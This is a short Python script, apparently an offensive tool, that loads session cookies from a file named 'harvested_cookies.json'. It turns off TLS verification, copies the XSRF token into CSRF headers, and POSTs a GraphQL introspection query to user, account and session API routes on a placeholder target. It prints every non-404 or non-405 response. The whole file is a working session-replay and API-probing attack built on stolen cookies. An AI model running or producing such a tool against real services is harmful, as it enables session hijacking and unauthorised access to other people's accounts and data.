import json
import httpx
import warnings

warnings.filterwarnings("ignore")

COOKIE_FILE = "harvested_cookies.json"
API_GATEWAY = "https://api.yourtarget.com"

def fuzz_with_csrf():
    print("[*] Initializing CSRF-Injected Gateway Fuzzer...")
    
    try:
        with open(COOKIE_FILE, "r", encoding="utf-8") as f:
            cookies_list = json.load(f)
    except Exception as e:
        print(f"[!] Error loading {COOKIE_FILE}: {e}")
        return
        
    cookie_jar = {c['name']: c['value'] for c in cookies_list}
    xsrf_token = cookie_jar.get("XSRF-TOKEN", "")
    
    print(f"[+] Loaded {len(cookie_jar)} cookies. XSRF-TOKEN present: {bool(xsrf_token)}")
    
    client = httpx.Client(verify=False, timeout=10.0, follow_redirects=False, cookies=cookie_jar)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    if xsrf_token:
        headers["X-XSRF-TOKEN"] = xsrf_token
        headers["X-CSRF-Token"] = xsrf_token
        
    routes = [
        "/api/v1/users/current",
        "/api/v2/users/current",
        "/api/v1/accounts",
        "/api/v2/accounts",
        "/api/v1/auth/session",
        "/graphql",
        "/api/graphql"
    ]
    
    payload = {"query": "{ __schema { types { name } } }"}
    
    print(f"[+] Probing {len(routes)} API paths on {API_GATEWAY} with CSRF injection...\n")
    
    for route in routes:
        url = API_GATEWAY + route
        try:
            res = client.post(url, json=payload, headers=headers)
            print(f"    -> POST {route} | Status: {res.status_code} | Length: {len(res.text)}")
            if res.status_code not in [404, 405]:
                print(f"        [***] SUCCESSFUL GATEWAY RESPONSE:\n{res.text[:500]}\n")
        except httpx.RequestError as e:
            print(f"    -> Connection Error on {route}: {e}")
            
    client.close()
    print("[*] CSRF fuzzer cycle complete.")

if __name__ == "__main__":
    fuzz_with_csrf()
